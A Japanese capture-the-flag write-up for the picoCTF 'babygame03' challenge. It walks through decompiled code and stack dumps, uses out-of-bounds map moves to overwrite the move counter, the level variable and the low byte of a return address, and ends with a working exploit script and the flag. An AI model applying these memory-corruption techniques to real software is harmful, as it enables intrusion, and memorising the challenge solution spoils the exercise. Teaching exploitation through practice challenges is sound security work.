# babygame03:Binary Exploitation:400pts
Break the game and get the flag.  
Welcome to BabyGame 03! Navigate around the map and see what you can find! Be careful, you don't have many moves. There are obstacles that instantly end the game on collision. The game is available to download [here](game). There is no source available, so you'll have to figure your way around the map.  
You can connect with it using `nc rhea.picoctf.net 51791`.  

Hints  
1  
Use 'w','a','s','d' to move around.  
2  
There may be secret commands to make your life easy.  

# Solution
バイナリと接続先だけが渡される。  
接続すると、`wasd`で動けるゲームで`@`がプレイヤー、`#`が即死マス、`X`がゴールのようだ。  
`#`はマップの最も左上、`X`はマップの最も右下に配置されている。  
```bash
$ nc rhea.picoctf.net 51791

Player position: 4 4
Level: 1
End tile position: 29 89
Lives left: 50
#.........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
....@.....................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
..........................................................................................
.........................................................................................X
```
ステージの左右からはみ出ると、一つ上下の行の反対に移動することがわかる。  
つまり左右は繋がっており、左は上の行末に右は下の行頭につながっている。  
スタート位置は座標(5,5)で50回しか動けないので、左上に到達して即死することはできるが、右下でゴールできない。  
ひとまずバイナリをIDAでデコンパイルする。  
`main`は以下のようであった。  
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v3; // al
  int v5; // [esp+0h] [ebp-AACh] BYREF
  int v6; // [esp+4h] [ebp-AA8h] BYREF
  int v7; // [esp+8h] [ebp-AA4h]
  char v8[2700]; // [esp+13h] [ebp-A99h] BYREF
  int v9; // [esp+AA0h] [ebp-Ch]
  int *p_argc; // [esp+AA4h] [ebp-8h]

  p_argc = &argc;
  init_player(&v6);
  v5 = 1;
  v9 = 0;
  init_map(v8, &v6, &v5);
  print_map(v8, &v6, &v5);
  signal(2, sigint_handler);
  do
  {
    v3 = getchar(p_argc);
    move_player(&v6, v3, v8, &v5);
    print_map(v8, &v6, &v5);
    if ( v6 == 29 && v7 == 89 && v5 != 4 )
    {
      puts("You win!\n Next level starting ");
      ++v9;
      ++v5;
      init_player(&v6);
      init_map(v8, &v6, &v5);
    }
  }
  while ( v6 != 29 || v7 != 89 || v5 != 5 || v9 != 4 );
  win(&v5);
  return 0;
}
```
マップデータは`v8[2700]`と一本の配列として実装されており、前後で現在のレベル`v5`、ユーザの座標や残り移動回数`v6, v7`、ひとつ前のレベル`v9`が定義されている。  
すべてクリアすると、以下の`win`が呼ばれるようだ。  
```c
int __cdecl win(int *a1)
{
  int result; // eax
  int v2; // [esp-Ch] [ebp-54h]
  int v3; // [esp-8h] [ebp-50h]
  int v4; // [esp-4h] [ebp-4Ch]
  char v5[60]; // [esp+0h] [ebp-48h] BYREF
  int v6; // [esp+3Ch] [ebp-Ch]

  v6 = fopen("flag.txt", "r");
  if ( !v6 )
  {
    puts("Please create 'flag.txt' in this directory with your own debugging flag.");
    fflush(stdout);
    exit(0, v2, v3, v4);
  }
  fgets(v5, 60, v6);
  result = *a1;
  if ( *a1 == 5 )
  {
    printf(v5);
    return fflush(stdout);
  }
  return result;
}
```
レベルが5である場合しかフラグを表示しないので、`win`をいきなり呼び出すようなチートは使えない(そもそも呼べないが)。  
次にプレイヤーの移動を司る、`move_player`を見る。  
```c
_DWORD *__cdecl move_player(_DWORD *a1, char a2, int a3, int a4)
{
  _DWORD *result; // eax
  int v5; // [esp-Ch] [ebp-24h]
  int v6; // [esp-8h] [ebp-20h]
  int v7; // [esp-4h] [ebp-1Ch]

  if ( (int)a1[2] <= 0 )
  {
    puts("No more lives left. Game over!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  if ( a2 == 108 )
    player_tile = getchar();
  if ( a2 == 112 )
    solve_round(a3, a1, a4);
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = 46;
  switch ( a2 )
  {
    case 'w':
      --*a1;
      break;
    case 's':
      ++*a1;
      break;
    case 'a':
      --a1[1];
      break;
    case 'd':
      ++a1[1];
      break;
  }
  if ( *(_BYTE *)(a1[1] + a3 + 90 * *a1) == 35 )
  {
    puts("You hit an obstacle!");
    fflush(stdout);
    exit(0, v5, v6, v7);
  }
  *(_BYTE *)(a1[1] + a3 + 90 * *a1) = player_tile;
  result = a1;
  --a1[2];
  return result;
}
```
`wasd`以外にプレイヤーの表示を変える`l`(`f ( a2 == 108 )`)や自動でゴールまで行く`p`(`if ( a2 == 112 )`)コマンドがあるようだ。  
では、`p`を使い続ければよいかというとそうではなく、移動回数が尽きて死んでしまう。  
ここで、プレイヤーがマップ上下からはみ出した場合にマップ配列の前後にあるメモリにアクセスできることに気づく。  
また、プレイヤーが移動した後のマスは必ず`.`(`0x2e`)に書き換わる。  
これを利用して、うまく移動回数の領域を破壊して増やせないだろうか。  
手動で試していると`aaaaawwwaaaaws`でうまく破壊される。  
`move_player`にブレイクポイントを張って見ると、マップデータ周辺のstackは以下のように書き換えられていた。  
移動前  
```
3b:00ec│+074 0xffffc39c ◂— 0x1
3c:00f0│+078 0xffffc3a0 ◂— 0x1
3d:00f4│+07c 0xffffc3a4 ◂— 0xfffffffb
3e:00f8│+080 0xffffc3a8 ◂— 0x25 /* '%' */
3f:00fc│+084 0xffffc3ac ◂— 0x23000000
40:0100│+088 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
移動後  
```
3b:00ec│+074 0xffffc39c ◂— 0x1
3c:00f0│+078 0xffffc3a0 ◂— 0x1
3d:00f4│+07c 0xffffc3a4 ◂— 0xfffffffb
3e:00f8│+080 0xffffc3a8 ◂— 0x2e0021 /* '!' */
3f:00fc│+084 0xffffc3ac ◂— 0x23000000
40:0100│+088 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
`0x25`が`0x2e0021`になっている。  
これで`p`を使ってゴールまで行ける。  
注意だが、いきなり`p`を使うと即死マスを通るので`aaaaawwwaaaawsdddd`のように安全なところまで移動して`p`を使う。  
これで`win`を呼べるかと思うが、レベル4で詰まる。  
`main`をよく見ると以下のような比較でレベル4からレベル5へは到達できないようになっている。  
```c
~~~
    print_map(v8, &v6, &v5);
    if ( v6 == 29 && v7 == 89 && v5 != 4 )
    {
      puts("You win!\n Next level starting ");
      ++v9;
      ++v5;
~~~
```
移動回数を増やした際と同じテクニックでメモリ上のレベルの領域まで移動し、`l`で一時的にプレイヤー表示を`\x04`にして任意のレベルになることはできる。  
ループを抜け`win`に到達するためには現在のレベルが5でひとつ前のレベルが4である必要がある。  
その場所を離れると`.`(`0x2e`)に書き換わり、とんでもないレベルになってしまうため、現在のレベルかひとつ前のレベルのどちらか一方の条件しか満たせない。  
```c
~~~
  }
  }
  while ( v6 != 29 || v7 != 89 || v5 != 5 || v9 != 4 );
  win(&v5);
~~~
```
何とかして現在のレベルが4である際の比較を突破できないかと考える。  
ここで、スタック上にある`main`のどこかのリターンアドレスの末尾1バイト部分にプレイヤーを移動し、`l`でプレイヤー表示を変えれば`main`内の別の場所にジャンプできることに気づく。  
比較を終えた場所に飛びたいので、ジャンプ先を探す。  
```bash
$ checksec --file=./game
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   60 Symbols        No    0               2               ./game
$ objdump -D ./game

./game:     file format elf32-i386
~~~
08049871 <main>:
~~~
 8049947:       e8 07 fb ff ff          call   8049453 <print_map>
 804994c:       83 c4 10                add    $0x10,%esp
 804994f:       8b 85 58 f5 ff ff       mov    -0xaa8(%ebp),%eax
 8049955:       83 f8 1d                cmp    $0x1d,%eax
 8049958:       75 6d                   jne    80499c7 <main+0x156>
 804995a:       8b 85 5c f5 ff ff       mov    -0xaa4(%ebp),%eax
 8049960:       83 f8 59                cmp    $0x59,%eax
 8049963:       75 62                   jne    80499c7 <main+0x156>
 8049965:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 804996b:       83 f8 04                cmp    $0x4,%eax
 804996e:       74 57                   je     80499c7 <main+0x156>
 8049970:       83 ec 0c                sub    $0xc,%esp
 8049973:       8d 83 e8 e0 ff ff       lea    -0x1f18(%ebx),%eax
 8049979:       50                      push   %eax
 804997a:       e8 31 f7 ff ff          call   80490b0 <puts@plt>
 804997f:       83 c4 10                add    $0x10,%esp
 8049982:       83 45 f4 01             addl   $0x1,-0xc(%ebp)
 8049986:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 804998c:       83 c0 01                add    $0x1,%eax
 804998f:       89 85 54 f5 ff ff       mov    %eax,-0xaac(%ebp)
 8049995:       83 ec 0c                sub    $0xc,%esp
 8049998:       8d 85 58 f5 ff ff       lea    -0xaa8(%ebp),%eax
 804999e:       50                      push   %eax
 804999f:       e8 62 fb ff ff          call   8049506 <init_player>
~~~
```
`0x8049970`に飛べばよさそうなので、あとはスタック上で`0x80499XX`のリターンアドレスを探す。  
注意として、メモリを`.`(`0x2e`)に書き換えながら移動するのでマップ外を移動するとプログラムが落ちる。  
マップ上で書き換えたい場所の一行下まで移動し、`w`で最後にピンポイントで移動するのが良い。  
`aaaaawwwaaaawsddddaaw`とアドレス末尾の位置へ移動し、8バイトずつ上へ遡っていくことを考える。  
`move_player`でにブレイクポイントを張り、stackを見ると以下の通りであった。  
```
00:0000│ esp 0xffffc37c —▸ 0x804992c (main+187) ◂— add esp, 0x10
01:0004│-ac8 0xffffc380 —▸ 0xffffc3a0 ◂— 0x0
02:0008│-ac4 0xffffc384 ◂— 0x77 /* 'w' */
03:000c│-ac0 0xffffc388 —▸ 0xffffc3af ◂— 0x2e2e2e2e ('....')
04:0010│-abc 0xffffc38c —▸ 0xffffc39c ◂— 0x4
05:0014│-ab8 0xffffc390 —▸ 0xf7fbe480 ◂— '/lib/i386-linux-gnu/libc.so.6'
06:0018│-ab4 0xffffc394 —▸ 0xffffcf10 ◂— 0x1
07:001c│-ab0 0xffffc398 ◂— 0x0
08:0020│-aac 0xffffc39c ◂— 0x4
09:0024│ eax 0xffffc3a0 ◂— 0x0
0a:0028│-aa4 0xffffc3a4 ◂— 0xfffffffd
0b:002c│-aa0 0xffffc3a8 ◂— 0x2e001b
0c:0030│-a9c 0xffffc3ac ◂— 0x2e000040 /* '@' */
0d:0034│-a98 0xffffc3b0 ◂— 0x2e2e2e2e ('....')
```
`0xffffc37f`を書き換えたいため、4 * 12バイト上に移動すればよい。  
これで現在のレベルが5であり、ひとつ前のレベルが4である条件を達成できる。  
その後に`p`を使用すれば`win`に行けるかと思うが、永遠にレベルが上がり続ける。  
仕方がないので、先ほどと同じテクニックを使い`main`の`win`を呼び出す個所に飛ぶ。  
```bash
$ objdump -D ./game

./game:     file format elf32-i386
~~~
08049871 <main>:
~~~
 80499c4:       83 c4 10                add    $0x10,%esp
 80499c7:       8b 85 58 f5 ff ff       mov    -0xaa8(%ebp),%eax
 80499cd:       83 f8 1d                cmp    $0x1d,%eax
 80499d0:       0f 85 2f ff ff ff       jne    8049905 <main+0x94>
 80499d6:       8b 85 5c f5 ff ff       mov    -0xaa4(%ebp),%eax
 80499dc:       83 f8 59                cmp    $0x59,%eax
 80499df:       0f 85 20 ff ff ff       jne    8049905 <main+0x94>
 80499e5:       8b 85 54 f5 ff ff       mov    -0xaac(%ebp),%eax
 80499eb:       83 f8 05                cmp    $0x5,%eax
 80499ee:       0f 85 11 ff ff ff       jne    8049905 <main+0x94>
 80499f4:       83 7d f4 04             cmpl   $0x4,-0xc(%ebp)
 80499f8:       0f 85 07 ff ff ff       jne    8049905 <main+0x94>
 80499fe:       83 ec 0c                sub    $0xc,%esp
 8049a01:       8d 85 54 f5 ff ff       lea    -0xaac(%ebp),%eax
 8049a07:       50                      push   %eax
 8049a08:       e8 af fd ff ff          call   80497bc <win>
~~~
```
ギリギリだが、`0x80499fe`に飛べばよい。  
注意点としてリターンアドレスは4 * 16バイト上になっているが、同じ手順で特定できる。  
以下のexploit.pyですべてを行う。  
```python
from ptrlib import *

elf = ELF("./game")
# sock = Process("./game")
sock = Socket("nc rhea.picoctf.net 51791")

sock.sendline("aaaaawwwaaaawsddddp") # -> level 2
sock.sendline("aaaaawwwaaaawsddddp") # -> level 3
sock.sendline("aaaaawwwaaaawsddddp") # -> level 4
sock.sendline("aaaaawwwaaaawsddddaa" + ("aaaa" * 12) + "l\x70w") # -> level 5
sock.sendline("aaaaawwwaaaawsddddaa" + ("aaaa" * 16) + "l\xfew") # -> win

sock.sh()
```
実行する。  
```bash
$ python exploit.py
[+] __init__: Successfully connected to rhea.picoctf.net:51791
~~~
..........................................................................................
.........................................................................................X
picoCTF{gamer_leveluP_5a39c266}
```
flagが表示された。  

## picoCTF{gamer_leveluP_5a39c266}